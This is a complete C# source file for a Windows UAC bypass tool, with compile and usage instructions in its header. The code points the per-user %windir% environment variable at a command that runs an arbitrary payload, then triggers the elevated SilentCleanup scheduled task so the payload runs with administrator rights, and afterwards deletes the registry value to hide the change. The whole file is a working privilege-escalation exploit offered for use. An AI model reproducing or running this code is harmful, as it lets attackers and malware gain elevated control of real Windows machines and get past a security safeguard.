/*
Created by: Julio Ureña (plaintext)
Twitter: @JulioUrena
Website: https://plaintext.do

Compile: csc.exe uac_bypass_silentcleanup.cs
Usage: uac_bypass_silentcleanup.exe C:\Path\To\Payload.exe
*/

using System;
using Microsoft.Win32;
using System.Diagnostics;

namespace UACBypass_SilentCleanup
{
    class Program
    {
        static void Main(string[] args)
        {
            // Payload to be executed
            Console.WriteLine("[+] Starting Bypass UAC.");

            string payload = "";

            if (args.Length > 0)
            {
                payload = args[0];
                Console.WriteLine(@"[+] Payload to be Executed " + payload);
            }
            else
            {
                Console.WriteLine("[+] No Payload specified. Executing cmd.exe.");
                payload = @"C:\Windows\System32\cmd.exe";
            }

            try
            {
                // Registry Key Modification
                RegistryKey key;
                key = Registry.CurrentUser.CreateSubKey(@"Environment");
                key.SetValue("windir", "cmd.exe /k " + payload + " & ", RegistryValueKind.String);
                key.Close();

                Console.WriteLine("[+] Enviroment Variabled %windir% Created.");
            }
            catch
            {
                Console.WriteLine("[-] Unable to Create the Enviroment Variabled %windir%.");
                Console.WriteLine("[-] Exit.");
            }

            //Wait 5 sec before execution
            Console.WriteLine("[+] Waiting 5 seconds before execution.");
            System.Threading.Thread.Sleep(5000);

            // Trigger the UAC Bypass 
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.CreateNoWindow = true;
                startInfo.UseShellExecute = false;
                startInfo.FileName = "schtasks.exe";
                startInfo.Arguments = @"/Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I";
                Process.Start(startInfo);

                Console.WriteLine("[+] UAC Bypass Application Executed.");
            }
            catch
            {
                Console.WriteLine("[-] Unable to Execute the Application schtasks.exe to perform the bypass.");
            }
            
            //Clean Registry
            DeleteKey();

            Console.WriteLine("[-] Exit.");
        }

        static void DeleteKey()
        {
            //Wait 5 sec before cleaning
            Console.WriteLine("[+] Registry Cleaning will start in 5 seconds.");
            System.Threading.Thread.Sleep(5000);

            try
            {
                var rkey = Registry.CurrentUser.OpenSubKey(@"Environment",true);

                // Validate if the Key Exist
                if (rkey != null)
                {
                    try
                    {
                        rkey.DeleteValue("windir");
                        rkey.Close();
                    }
                    catch (Exception err)
                    {
                        Console.WriteLine(@"[-] Unable to Delete the Registry key (Environment). Error "+err.Message);
                    }
                }

                Console.WriteLine("[+] Registry Cleaned.");
            }
            catch
            {
                Console.WriteLine("[-] Unable to Clean the Registry.");
            }
        }
    }
}
